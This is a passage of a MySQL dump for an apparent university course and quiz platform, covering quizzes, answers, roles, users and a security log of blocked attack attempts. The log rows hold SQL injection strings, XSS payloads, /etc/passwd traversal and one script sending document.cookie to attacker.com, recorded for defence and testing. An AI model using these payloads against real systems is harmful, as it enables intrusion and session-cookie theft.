(21, 7, 'O(n)', 0, 1),
(22, 7, 'O(log n)', 0, 2),
(23, 7, 'O(1)', 1, 3),
(24, 7, 'O(n^2)', 0, 4),
(25, 8, 'True', 0, 1),
(26, 8, 'False', 1, 2),
(27, 9, 'Bubble Sort', 0, 1),
(28, 9, 'Merge Sort', 1, 2),
(29, 9, 'Insertion Sort', 0, 3),
(30, 9, 'Selection Sort', 0, 4),
(31, 10, 'True', 1, 1),
(32, 10, 'False', 0, 2),
(33, 11, 'INSERT', 0, 1),
(34, 11, 'UPDATE', 0, 2),
(35, 11, 'SELECT', 1, 3),
(36, 11, 'DELETE', 0, 4),
(37, 12, 'True', 1, 1),
(38, 12, 'False', 0, 2),
(39, 13, 'First Normal Form (1NF)', 0, 1),
(40, 13, 'Second Normal Form (2NF)', 0, 2),
(41, 13, 'Third Normal Form (3NF)', 1, 3),
(42, 13, 'Boyce-Codd Normal Form (BCNF)', 0, 4),
(43, 14, 'True', 1, 1),
(44, 14, 'False', 0, 2);

-- --------------------------------------------------------

--
-- Table structure for table `quizzes`
--

CREATE TABLE `quizzes` (
  `id` int(11) NOT NULL,
  `course_id` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `description` text DEFAULT NULL,
  `quiz_type` enum('mcq','true_false','mixed') DEFAULT 'mixed',
  `duration_minutes` int(11) NOT NULL DEFAULT 30,
  `total_marks` decimal(10,2) NOT NULL DEFAULT 100.00,
  `passing_marks` decimal(10,2) DEFAULT 50.00,
  `start_time` datetime NOT NULL,
  `end_time` datetime NOT NULL,
  `shuffle_questions` tinyint(1) DEFAULT 0,
  `show_results_immediately` tinyint(1) DEFAULT 1,
  `is_published` tinyint(1) DEFAULT 0,
  `created_by` int(11) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `quizzes`
--

INSERT INTO `quizzes` (`id`, `course_id`, `title`, `description`, `quiz_type`, `duration_minutes`, `total_marks`, `passing_marks`, `start_time`, `end_time`, `shuffle_questions`, `show_results_immediately`, `is_published`, `created_by`, `created_at`, `updated_at`) VALUES
(1, 1, 'Week 1-3 Assessment', 'Assessment covering introductory concepts, algorithms, and basic programming fundamentals.', 'mixed', 30, 10.00, 50.00, '2026-06-14 09:00:00', '2026-06-21 23:59:59', 1, 1, 1, 2, '2026-06-14 08:30:00', '2026-06-14 08:30:00'),
(2, 2, 'Data Structures Quiz', 'Test your knowledge on arrays, linked lists, stacks, queues, and basic sorting algorithms.', 'mixed', 45, 15.00, 60.00, '2026-06-15 09:00:00', '2026-06-22 23:59:59', 1, 1, 1, 2, '2026-06-14 08:35:00', '2026-06-14 08:35:00'),
(3, 3, 'Database Fundamentals Quiz', 'Assessment on SQL basics, normalization, and database design principles.', 'mixed', 40, 10.00, 50.00, '2026-06-16 09:00:00', '2026-06-23 23:59:59', 0, 1, 0, 2, '2026-06-14 08:38:00', '2026-06-14 08:38:00'),
(4, 1, 'Programming Basics Review', 'Quick review quiz on C programming syntax, variables, and control structures.', 'mcq', 20, 8.00, 50.00, '2026-06-17 09:00:00', '2026-06-24 23:59:59', 0, 1, 0, 2, '2026-06-14 08:42:00', '2026-06-14 08:42:00');

-- --------------------------------------------------------

--
-- Table structure for table `quiz_answers`
--

CREATE TABLE `quiz_answers` (
  `id` int(11) NOT NULL,
  `attempt_id` int(11) NOT NULL,
  `question_id` int(11) NOT NULL,
  `selected_answer` text DEFAULT NULL,
  `is_correct` tinyint(1) DEFAULT NULL,
  `marks_obtained` decimal(5,2) DEFAULT 0.00,
  `answered_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `quiz_answers`
--

INSERT INTO `quiz_answers` (`id`, `attempt_id`, `question_id`, `selected_answer`, `is_correct`, `marks_obtained`, `answered_at`) VALUES
(1, 1, 1, 'Central Processing Unit', 1, 2.00, '2026-06-14 09:31:00'),
(2, 1, 2, 'Python', 1, 2.00, '2026-06-14 09:32:00'),
(3, 1, 3, 'True', 1, 2.00, '2026-06-14 09:33:00'),
(4, 1, 4, 'O(log n)', 1, 2.00, '2026-06-14 09:34:00'),
(5, 1, 5, 'True', 1, 2.00, '2026-06-14 09:35:00');

-- --------------------------------------------------------

--
-- Table structure for table `quiz_attempts`
--

CREATE TABLE `quiz_attempts` (
  `id` int(11) NOT NULL,
  `quiz_id` int(11) NOT NULL,
  `student_id` int(11) NOT NULL,
  `started_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `submitted_at` datetime DEFAULT NULL,
  `score` decimal(10,2) DEFAULT NULL,
  `total_marks` decimal(10,2) NOT NULL,
  `percentage` decimal(5,2) DEFAULT NULL,
  `status` enum('in_progress','submitted','auto_submitted','graded') DEFAULT 'in_progress',
  `time_remaining_seconds` int(11) DEFAULT NULL,
  `ip_address` varchar(45) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `quiz_attempts`
--

INSERT INTO `quiz_attempts` (`id`, `quiz_id`, `student_id`, `started_at`, `submitted_at`, `score`, `total_marks`, `percentage`, `status`, `time_remaining_seconds`, `ip_address`) VALUES
(1, 1, 4, '2026-06-14 09:30:00', '2026-06-14 09:35:00', 10.00, 10.00, 100.00, 'graded', 1500, '::1'),
(3, 2, 4, '2026-06-16 09:00:00', '2026-06-16 09:40:00', 12.00, 15.00, 80.00, 'graded', 300, '::1');

-- --------------------------------------------------------

--
-- Table structure for table `roles`
--

CREATE TABLE `roles` (
  `id` int(11) NOT NULL,
  `role_name` varchar(20) NOT NULL,
  `display_name` varchar(50) NOT NULL,
  `description` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `roles`
--

INSERT INTO `roles` (`id`, `role_name`, `display_name`, `description`, `created_at`) VALUES
(1, 'admin', 'Administrator', 'System administrator with full access to manage users, courses, and system settings.', '2026-06-14 07:00:00'),
(2, 'doctor', 'Doctor', 'Faculty doctor who creates courses, quizzes, and assignments, and grades student work.', '2026-06-14 07:00:00'),
(3, 'ta', 'Teaching Assistant', 'Teaching assistant who helps grade assignments and assist students under doctor supervision.', '2026-06-14 07:00:00'),
(4, 'student', 'Student', 'Student who enrolls in courses, takes quizzes, and submits assignments.', '2026-06-14 07:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `security_logs`
--

CREATE TABLE `security_logs` (
  `id` int(11) NOT NULL,
  `ip_address` varchar(45) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `username_attempt` varchar(100) DEFAULT NULL,
  `attack_type` varchar(50) NOT NULL,
  `description` text NOT NULL,
  `request_url` varchar(500) DEFAULT NULL,
  `request_method` varchar(10) DEFAULT NULL,
  `request_data` text DEFAULT NULL,
  `severity` enum('low','medium','high','critical') DEFAULT 'medium',
  `action_taken` varchar(100) DEFAULT 'blocked',
  `confidence` decimal(5,2) DEFAULT 0.00,
  `user_agent` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `security_logs`
--

INSERT INTO `security_logs` (`id`, `ip_address`, `user_id`, `username_attempt`, `attack_type`, `description`, `request_url`, `request_method`, `request_data`, `severity`, `action_taken`, `confidence`, `user_agent`, `created_at`) VALUES
(1, '192.168.1.100', NULL, NULL, 'SQL Injection', 'Attempted UNION-based SQL injection in login form with \' OR \'1\'=\'1', '/api/login.php', 'POST', NULL, 'high', 'blocked', 95.50, 'Mozilla/5.0', '2026-06-14 06:00:00'),
(2, '10.0.0.50', NULL, NULL, 'XSS', '<script>alert(document.cookie)</script> payload in search field', '/search.php', 'GET', NULL, 'medium', 'blocked', 98.00, 'Mozilla/5.0', '2026-06-14 06:05:00'),
(3, '172.16.0.20', NULL, NULL, 'Path Traversal', 'Attempted directory traversal with ../../../etc/passwd', '/download.php', 'GET', NULL, 'high', 'blocked', 99.00, 'Mozilla/5.0', '2026-06-14 06:10:00'),
(4, '192.168.1.105', NULL, NULL, 'SQL Injection', 'Time-based blind SQL injection attempt with \' AND SLEEP(5)--', '/api/quiz.php', 'POST', NULL, 'critical', 'blocked', 97.50, 'Mozilla/5.0', '2026-06-14 06:15:00'),
(5, '::1', NULL, 'admin', 'Failed Login', 'Invalid password for user: admin - 3 consecutive failed attempts', '/api/auth.php', 'POST', '{\"username\":\"admin\"}', 'medium', 'rate_limited', 0.00, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', '2026-06-14 08:02:00'),
(6, '::1', NULL, 'unknown_user', 'Failed Login', 'Invalid username attempt: unknown_user', '/api/auth.php', 'POST', '{\"username\":\"unknown_user\"}', 'low', 'logged', 0.00, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', '2026-06-14 08:03:00'),
(7, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 12:35:40'),
(8, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 12:35:47'),
(9, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 12:35:51'),
(10, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 12:56:54'),
(11, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"ss\",\"department\":\"\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 12:57:03'),
(12, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"d9411a736b85d999871fbb3fce84877147a40b2fc835812e70deeee0ced9bd2c\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 12:57:23'),
(13, '::1', NULL, NULL, 'Path Traversal', 'AI Shield Blocked a Path Traversal attempt. Payload: {\"get\":{\"section\":\"courses\\/etc\\/passwd\"},\"post\":[]}', '/admin/dashboard.php?section=courses/etc/passwd', 'GET', '{\"get\":{\"section\":\"courses\\/etc\\/passwd\"},\"post\":[]}', 'critical', 'blocked', 99.94, NULL, '2026-06-14 13:05:26'),
(14, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"92f58f0a04f3bde689d32e958518a95b9afa8df3e348cbeb2f7eb4e91fe28ed5\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"92f58f0a04f3bde689d32e958518a95b9afa8df3e348cbeb2f7eb4e91fe28ed5\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 15:32:35'),
(15, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"92f58f0a04f3bde689d32e958518a95b9afa8df3e348cbeb2f7eb4e91fe28ed5\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"92f58f0a04f3bde689d32e958518a95b9afa8df3e348cbeb2f7eb4e91fe28ed5\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 15:32:48'),
(16, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"92f58f0a04f3bde689d32e958518a95b9afa8df3e348cbeb2f7eb4e91fe28ed5\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"92f58f0a04f3bde689d32e958518a95b9afa8df3e348cbeb2f7eb4e91fe28ed5\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 15:32:59'),
(17, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"92f58f0a04f3bde689d32e958518a95b9afa8df3e348cbeb2f7eb4e91fe28ed5\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', '/api/courses.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"92f58f0a04f3bde689d32e958518a95b9afa8df3e348cbeb2f7eb4e91fe28ed5\",\"course_code\":\"CSE222\",\"credit_hours\":\"3\",\"course_name\":\"<script>alert(1);<\\/script>\",\"description\":\"<script>alert(1);<\\/script>\",\"department\":\"Computer Engineering\",\"semester\":\"First\",\"year\":\"1\",\"action\":\"create\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 15:35:01'),
(18, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"de06a8376af052582f4e162ed2fdab08979649d3e2dd5d12c30e82dca6728132\",\"id\":\"5\",\"action\":\"update\",\"title\":\"programming assignment2\",\"description\":\"<script>alert(1);<\\/script>\",\"instructions\":\"<script>alert(1);<\\/script>\",\"deadline\":\"2026-06-27T16:34\",\"max_marks\":\"10\"}}', '/api/assignments.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"de06a8376af052582f4e162ed2fdab08979649d3e2dd5d12c30e82dca6728132\",\"id\":\"5\",\"action\":\"update\",\"title\":\"programming assignment2\",\"description\":\"<script>alert(1);<\\/script>\",\"instructions\":\"<script>alert(1);<\\/script>\",\"deadline\":\"2026-06-27T16:34\",\"max_marks\":\"10\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 15:36:23'),
(19, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"de06a8376af052582f4e162ed2fdab08979649d3e2dd5d12c30e82dca6728132\",\"id\":\"5\",\"action\":\"update\",\"title\":\"programming assignment2\",\"description\":\"<script>alert(1);<\\/script>\",\"instructions\":\"<script>alert(1);<\\/script>\",\"deadline\":\"2026-06-27T16:34\",\"max_marks\":\"10\"}}', '/api/assignments.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"de06a8376af052582f4e162ed2fdab08979649d3e2dd5d12c30e82dca6728132\",\"id\":\"5\",\"action\":\"update\",\"title\":\"programming assignment2\",\"description\":\"<script>alert(1);<\\/script>\",\"instructions\":\"<script>alert(1);<\\/script>\",\"deadline\":\"2026-06-27T16:34\",\"max_marks\":\"10\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 15:36:34'),
(20, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"de06a8376af052582f4e162ed2fdab08979649d3e2dd5d12c30e82dca6728132\",\"id\":\"5\",\"action\":\"update\",\"title\":\"programming assignment2\",\"description\":\"<script>alert(1);<\\/script>\",\"instructions\":\"<script>alert(1);<\\/script>\",\"deadline\":\"2026-06-27T16:34\",\"max_marks\":\"10\"}}', '/api/assignments.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"de06a8376af052582f4e162ed2fdab08979649d3e2dd5d12c30e82dca6728132\",\"id\":\"5\",\"action\":\"update\",\"title\":\"programming assignment2\",\"description\":\"<script>alert(1);<\\/script>\",\"instructions\":\"<script>alert(1);<\\/script>\",\"deadline\":\"2026-06-27T16:34\",\"max_marks\":\"10\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 15:46:03'),
(21, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":[],\"post\":{\"csrf_token\":\"592bd55aff251b0b707fb8fbc0e45cc88028d7d78a0b568d6ff551b05fd9ec8c\",\"id\":\"6\",\"full_name\":\"<script>alert(1);<\\/script>\",\"role_id\":\"3\",\"is_active\":\"1\",\"department\":\"Computer Engineering\",\"password\":\"password\",\"action\":\"update\"}}', '/api/users.php', 'POST', '{\"get\":[],\"post\":{\"csrf_token\":\"592bd55aff251b0b707fb8fbc0e45cc88028d7d78a0b568d6ff551b05fd9ec8c\",\"id\":\"6\",\"full_name\":\"<script>alert(1);<\\/script>\",\"role_id\":\"3\",\"is_active\":\"1\",\"department\":\"Computer Engineering\",\"password\":\"password\",\"action\":\"update\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 15:56:45'),
(22, '::1', NULL, NULL, 'SQL Injection', 'AI Shield Blocked a SQL Injection attempt. Payload: {\"get\":{\"id\":\"1 OR 1=1\"},\"post\":[]}', '/logout.php?id=1%20OR%201=1', 'GET', '{\"get\":{\"id\":\"1 OR 1=1\"},\"post\":[]}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 16:14:44'),
(23, '::1', NULL, NULL, 'SQL Injection', 'AI Shield Blocked a SQL Injection attempt. Payload: {\"get\":{\"id\":\"1 UNION SELECT NULL, username, password FROM users\"},\"post\":[]}', '/student/dashboard.php?id=1%20UNION%20SELECT%20NULL,%20username,%20password%20FROM%20users', 'GET', '{\"get\":{\"id\":\"1 UNION SELECT NULL, username, password FROM users\"},\"post\":[]}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 16:15:27'),
(24, '::1', NULL, NULL, 'SQL Injection', 'AI Shield Blocked a SQL Injection attempt. Payload: {\"get\":{\"id\":\"1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)\"},\"post\":[]}', '/student/dashboard.php?id=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)', 'GET', '{\"get\":{\"id\":\"1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)\"},\"post\":[]}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 16:16:12'),
(25, '::1', NULL, 'admin\' OR \'1\'=\'1', 'SQL Injection', 'AI Shield Blocked a SQL Injection attempt. Payload: {\"get\":[],\"post\":{\"action\":\"login\",\"username\":\"admin\' OR \'1\'=\'1\",\"password\":\"admin\",\"csrf_token\":\"ebfd6defac14edaf347d7ef697366e9ca4681848a556ee5e24c2412245927f67\"}}', '/api/auth.php', 'POST', '{\"get\":[],\"post\":{\"action\":\"login\",\"username\":\"admin\' OR \'1\'=\'1\",\"password\":\"admin\",\"csrf_token\":\"ebfd6defac14edaf347d7ef697366e9ca4681848a556ee5e24c2412245927f67\"}}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 16:16:34'),
(26, '::1', NULL, NULL, 'SQL Injection', 'AI Shield Blocked a SQL Injection attempt. Payload: {\"get\":{\"id\":\"1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)\"},\"post\":[]}', '/student/dashboard.php?id=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)', 'GET', '{\"get\":{\"id\":\"1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)\"},\"post\":[]}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 16:16:40'),
(27, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":{\"<img_src\":\"x onerror=alert(document.domain)>\"},\"post\":[]}', '/admin/dashboard.php?%3Cimg%20src=x%20onerror=alert(document.domain)%3E', 'GET', '{\"get\":{\"<img_src\":\"x onerror=alert(document.domain)>\"},\"post\":[]}', 'critical', 'blocked', 99.99, NULL, '2026-06-14 16:17:24'),
(28, '::1', NULL, NULL, 'XSS', 'AI Shield Blocked a XSS attempt. Payload: {\"get\":{\"<script>fetch(\'https:\\/\\/attacker_com\\/log?c\":\"\' document.cookie)<\\/script>\"},\"post\":[]}', '/admin/dashboard.php?%3Cscript%3Efetch(%27https://attacker.com/log?c=%27+document.cookie)%3C/script%3E', 'GET', '{\"get\":{\"<script>fetch(\'https:\\/\\/attacker_com\\/log?c\":\"\' document.cookie)<\\/script>\"},\"post\":[]}', 'critical', 'blocked', 100.00, NULL, '2026-06-14 16:17:38');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `email` varchar(100) NOT NULL,
  `password_hash` varchar(255) NOT NULL,
  `full_name` varchar(100) NOT NULL,
  `role_id` int(11) NOT NULL,
  `avatar` varchar(255) DEFAULT NULL,
  `phone` varchar(20) DEFAULT NULL,
  `department` varchar(100) DEFAULT NULL,
  `is_active` tinyint(1) DEFAULT 1,
  `last_login` datetime DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `email`, `password_hash`, `full_name`, `role_id`, `avatar`, `phone`, `department`, `is_active`, `last_login`, `created_at`, `updated_at`) VALUES
(1, 'admin', 'admin@benha.edu.eg', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'System Administrator', 1, NULL, '+20-100-000-0001', 'IT Department', 1, '2026-06-14 19:16:47', '2026-06-14 07:00:00', '2026-06-14 16:16:47'),
(2, 'doctor', 'doctor@benha.edu.eg', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'Dr. Ahmed Hassan', 2, NULL, '+20-100-000-0002', 'Computer Engineering', 1, '2026-06-14 19:07:32', '2026-06-14 07:00:00', '2026-06-14 16:07:32'),
(3, 'ta', 'ta@benha.edu.eg', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'Eng. Mohamed Ali', 3, NULL, '+20-100-000-0003', 'Computer Engineering', 1, '2026-06-14 08:10:00', '2026-06-14 07:00:00', '2026-06-14 08:10:00'),
(4, 'student', 'student@benha.edu.eg', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'Mostafa Sayed', 4, NULL, '+20-100-000-0004', 'Computer Engineering', 1, '2026-06-14 19:07:04', '2026-06-14 07:00:00', '2026-06-14 16:07:04'),
(6, 'ebrahim', 'ebrahim@benha.edu.eg', '$2y$10$dPIwEds50SPH1i5ktq9KbOOz302n0..LCRlj0lA7mXh1f3pkiZV5K', 'Eng. Ebrahim Salah', 3, NULL, NULL, 'Computer Engineering', 1, NULL, '2026-06-14 12:59:20', '2026-06-14 13:01:26');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `activity_logs`
--
ALTER TABLE `activity_logs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `assignments`
--
ALTER TABLE `assignments`
  ADD PRIMARY KEY (`id`),
  ADD KEY `course_id` (`course_id`),
  ADD KEY `created_by` (`created_by`);

--
-- Indexes for table `assignment_files`
--
ALTER TABLE `assignment_files`
  ADD PRIMARY KEY (`id`),
  ADD KEY `assignment_id` (`assignment_id`),
  ADD KEY `uploaded_by` (`uploaded_by`);

--
-- Indexes for table `assignment_submissions`
--
ALTER TABLE `assignment_submissions`
  ADD PRIMARY KEY (`id`),
  ADD KEY `assignment_id` (`assignment_id`),
  ADD KEY `student_id` (`student_id`),
  ADD KEY `graded_by` (`graded_by`);

--
-- Indexes for table `courses`
--
ALTER TABLE `courses`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `course_code` (`course_code`),
  ADD KEY `created_by` (`created_by`);

--
-- Indexes for table `course_doctors`
--
ALTER TABLE `course_doctors`
  ADD PRIMARY KEY (`id`),
